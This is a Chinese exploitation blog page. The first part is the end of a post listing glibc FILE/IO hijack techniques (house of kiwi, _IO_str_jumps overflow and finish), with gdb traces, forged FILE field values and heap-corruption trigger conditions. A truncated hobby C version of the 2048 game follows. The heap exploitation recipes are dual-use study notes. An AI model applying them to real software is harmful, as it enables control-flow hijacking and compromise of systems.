<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fc235f79a20</span> &lt;_IO_cookie_write+<span class="number">48</span>&gt;    call   rax                           &lt;getkeyserv_handle+<span class="number">528</span>&gt;</span><br><span class="line">       rdi: <span class="number">0x562b7f47baf0</span> ◂— <span class="number">0x0</span> <span class="comment">/* __cookie:可控heap */</span></span><br><span class="line">       rsi: <span class="number">0x7fc2360bb360</span> ◂— <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span></span><br><span class="line">       rdx: <span class="number">0x0</span></span><br><span class="line">       rcx: <span class="number">0x0</span>    </span><br></pre></td></tr></table></figure>
<p>触发条件：</p>
<ul>
<li>伪造 vtable = IO_wfile_jumps+0x40</li>
<li>修改 top chunk -&gt; P = 0，使 top chunk 不够分配</li>
</ul>
<p><strong>house of kiwi</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert -&gt; fflush -&gt; sync(_IO_file_jumps)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7e78523</span> &lt;fflush+<span class="number">131</span>&gt;    call   qword ptr [rbp + <span class="number">0x60</span>]        &lt;setcontext+<span class="number">61</span>&gt;</span><br><span class="line">       rdi: <span class="number">0x7ffff7fc35e0</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line">       rsi: <span class="number">0xc00</span></span><br><span class="line">       rdx: <span class="number">0x7ffff7fc38c0</span> (_IO_helper_jumps) ◂— <span class="number">0x0</span></span><br><span class="line">       rcx: <span class="number">0x7ffff7ef2417</span> (write+<span class="number">23</span>) ◂— cmp    rax, <span class="number">-0x1000</span> <span class="comment">/* &#x27;H=&#x27; */</span></span><br></pre></td></tr></table></figure>
<p>触发条件：</p>
<ul>
<li>修改 top chunk -&gt; P = 0，使 top chunk 不够分配</li>
</ul>
<p><strong>IO_flush_all</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all -&gt; _IO_flush_all_lockp -&gt; [_IO_wdefault_xsgetn](IO_wstrn_jumps) -&gt; _IO_switch_to_wget_mode</span><br></pre></td></tr></table></figure>
<p>触发条件：</p>
<ul>
<li>伪造 vtable = IO_wstrn_jumps+0x28</li>
<li>手动调用 <code>_IO_flush_all</code></li>
</ul>
<p><strong>_IO_str_jumps -&gt; _IO_str_overflow</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; _IO_str_overflow</span><br><span class="line">__run_exit_handlers -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_str_overflow</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>libc-2.27.so</code> 及之前，程序在 <code>_IO_str_overflow</code> 里可以通过 <code>call qword ptr [rbx + 0xe0]</code> 来执行指定的函数</li>
<li>在 <code>libc-2.29.so</code> 及之后，程序在 <code>__GI__IO_str_overflow</code> 里不再使用上面的指令，而是调用 <code>call malloc@plt</code> ，所以要在 <code>&amp;_IO_list_all.vtable+8</code> 处写入将要执行的函数</li>
</ul>
<p>伪造条件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_base = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr = addr_rdx</span><br><span class="line">fp-&gt;_IO_buf_base = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_buf_end = (addr_rdi - <span class="number">100</span>) / <span class="number">2</span></span><br><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br><span class="line">vtable = addr_IO_str_jumps</span><br></pre></td></tr></table></figure>
<p>触发条件：</p>
<ul>
<li>破坏 unsortedbin</li>
<li>执行 exit</li>
</ul>
<p><strong>_IO_str_jumps -&gt; _IO_str_finish</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; [_IO_str_finish]</span><br><span class="line">__run_exit_handlers -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; [_IO_str_finish]</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>libc-2.27.so</code> 及之前，程序在 <code>_IO_str_finish</code> 里可以通过 <code>call qword ptr [rbx + 0xe8]</code> 来执行指定的函数</li>
<li>在 <code>libc-2.29.so</code> 及之后，程序在 <code>_IO_str_finish</code> 里不再使用上面的指令，而是调用 <code>call free@plt</code> ，所以要在 <code>&amp;_IO_list_all.vtable+0x10</code> 处写入将要执行的函数</li>
</ul>
<p>伪造条件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr = <span class="number">0xffffffff</span></span><br><span class="line">fp-&gt;_IO_write_base = <span class="number">0</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_buf_base = addr_rdi <span class="comment">// 也就是 fp-&gt;_IO_write_end</span></span><br><span class="line">fp-&gt;_flags2 = <span class="number">0</span></span><br><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br><span class="line">vtable = addr_IO_str_jumps - <span class="number">8</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>触发条件：</p>
<ul>
<li>破坏 unsortedbin</li>
<li>执行 exit</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/31/C%E8%AF%AD%E8%A8%80%E7%89%882048/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/31/C%E8%AF%AD%E8%A8%80%E7%89%882048/" class="post-title-link" itemprop="url">不务正业系列：C语言版2048</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-31 15:02:38 / Modified: 15:13:43" itemprop="dateCreated datePublished" datetime="2022-08-31T15:02:38+08:00">2022-08-31</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/NoMaoWork/" itemprop="url" rel="index"><span itemprop="name">NoMaoWork</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>5.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>5 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>C语言版2048</strong></p>
<p>之前我复现了 Actf 的 2048，感觉这个游戏挺有意思（玩的有点上头），于是逆了逆源码，仿照他的思路也写了一个</p>
<p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">termios</span> <span class="title">old_config</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">termios</span> <span class="title">new_config</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *str_list[<span class="number">12</span>]=&#123;</span><br><span class="line">	<span class="string">&quot;39&quot;</span>,</span><br><span class="line">	<span class="string">&quot;31&quot;</span>,</span><br><span class="line">	<span class="string">&quot;32&quot;</span>,</span><br><span class="line">	<span class="string">&quot;33&quot;</span>,</span><br><span class="line">	<span class="string">&quot;34&quot;</span>,</span><br><span class="line">	<span class="string">&quot;35&quot;</span>,</span><br><span class="line">	<span class="string">&quot;36&quot;</span>,</span><br><span class="line">	<span class="string">&quot;37&quot;</span>,</span><br><span class="line">	<span class="string">&quot;91&quot;</span>,</span><br><span class="line">	<span class="string">&quot;92&quot;</span>,</span><br><span class="line">	<span class="string">&quot;93&quot;</span>,</span><br><span class="line">	<span class="string">&quot;94&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> score;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> extra;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> box[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"><span class="keyword">char</span> num[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">size_t</span> key[<span class="number">12</span>]=&#123;<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="number">0x40</span>,<span class="number">0x80</span>,<span class="number">0x100</span>,<span class="number">0x200</span>,<span class="number">0x400</span>,<span class="number">0x800</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> win;</span><br><span class="line"><span class="keyword">int</span> lose;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">table_show</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> m;</span><br><span class="line">	<span class="keyword">int</span> k;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;clear&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\x1B[2J\x1B[HScore: %ld&quot;</span>, score);</span><br><span class="line">	<span class="keyword">if</span>(extra)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; (+%ld)&quot;</span>,extra);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;+------+------+------+------+&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">3</span>;i++)&#123;</span><br><span class="line">		<span class="built_in">putchar</span>(<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;=<span class="number">3</span>;j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(box[i][j])&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\x1B[7m\x1B[%sm%*s \x1B[0m|&quot;</span>, str_list[box[i][j]], <span class="number">5</span>, num);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%*s |&quot;</span>, <span class="number">5</span>, num);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">		<span class="built_in">putchar</span>(<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">		<span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;=<span class="number">3</span>;k++)&#123;</span><br><span class="line">			<span class="keyword">if</span> (box[i][k])&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\x1B[7m\x1B[%sm%*zd \x1B[0m|&quot;</span>, str_list[box[i][k]], <span class="number">5</span>, key[box[i][k]]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%*s |&quot;</span>, <span class="number">5</span>, num);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">		<span class="built_in">putchar</span>(<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">		<span class="keyword">for</span>(m=<span class="number">0</span>;m&lt;=<span class="number">3</span>;m++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(box[i][m])&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\x1B[7m\x1B[%sm%*s \x1B[0m|&quot;</span>, str_list[box[i][m]], <span class="number">5</span>, num);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%*s |&quot;</span>, <span class="number">5</span>, num);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    	<span class="built_in">puts</span>(<span class="string">&quot;+------+------+------+------+&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">check_repeat</span><span class="params">(<span class="keyword">int</span> random_num)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line">	<span class="keyword">int</span> m;</span><br><span class="line">	<span class="keyword">int</span> re;</span><br><span class="line">	<span class="keyword">int</span> total=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">			m = i*<span class="number">4</span>+j;</span><br><span class="line">			<span class="keyword">if</span>(random_num==m)&#123;</span><br><span class="line">				<span class="keyword">if</span>(box[i][j]==<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					re = <span class="number">0</span>;	</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(box[i][j]!=<span class="number">0</span>)&#123;</span><br><span class="line">				total++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(total==<span class="number">16</span>)&#123;</span><br><span class="line">		re = <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">randomly_add</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> random_num1;</span><br><span class="line">	<span class="keyword">int</span> random_num2;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> key;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> m;</span><br><span class="line"></span><br><span class="line">	srand(time(<span class="number">0</span>));</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		random_num1 = rand() % <span class="number">16</span>;</span><br><span class="line">		key = check_repeat(random_num1);</span><br><span class="line">		<span class="keyword">if</span>(key == <span class="number">2</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(key == <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">			m=i*<span class="number">4</span>+j;</span><br><span class="line">			<span class="keyword">if</span>(m==random_num1)&#123;</span><br><span class="line">				random_num2 = rand();</span><br><span class="line">				<span class="keyword">if</span>(random_num2 == (random_num2/<span class="number">10</span>)*<span class="number">10</span>)&#123;</span><br><span class="line">					num=<span class="number">2</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					num=<span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				box[i][j]=num;</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">table_init</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">3</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;=<span class="number">0</span>;j++)&#123;</span><br><span class="line">			box[i][j]=<span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	score=<span class="number">0</span>;</span><br><span class="line">	extra=<span class="number">0</span>;</span><br><span class="line">	win=<span class="number">0</span>;</span><br><span class="line">	lose=<span class="number">0</span>;</span><br><span class="line">	randomly_add();</span><br><span class="line">	randomly_add();</span><br><span class="line">	table_show();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">table_check</span><span class="params">(<span class="keyword">int</span> extra_temp)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line"></span><br><span class="line">	extra = extra_temp/<span class="number">2</span>;</span><br><span class="line">	score += extra_temp/<span class="number">2</span>;</span><br><span class="line">	lose = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">3</span>;++i)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;=<span class="number">3</span>;++j)&#123;</span><br><span class="line">			<span class="keyword">if</span>(key[box[i][j]]==<span class="number">2048</span>)&#123;</span><br><span class="line">				win = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move_left</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line">	<span class="keyword">int</span> k;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">1</span>,k=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(box[i][j]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>(box[i][k]==box[i][j])&#123;</span><br><span class="line">					box[i][k]++;</span><br><span class="line">					box[i][j]=<span class="number">0</span>;</span><br><span class="line">					table_check(key[box[i][k]]);</span><br><span class="line">					k++;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(box[i][k]==<span class="number">0</span>)&#123;</span><br><span class="line">					box[i][k]=box[i][j];</span><br><span class="line">					box[i][j]=<span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					box[i][++k]=box[i][j];</span><br><span class="line">					<span class="keyword">if</span>(j!=k)&#123;</span><br><span class="line">						box[i][j]=<span class="number">0</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				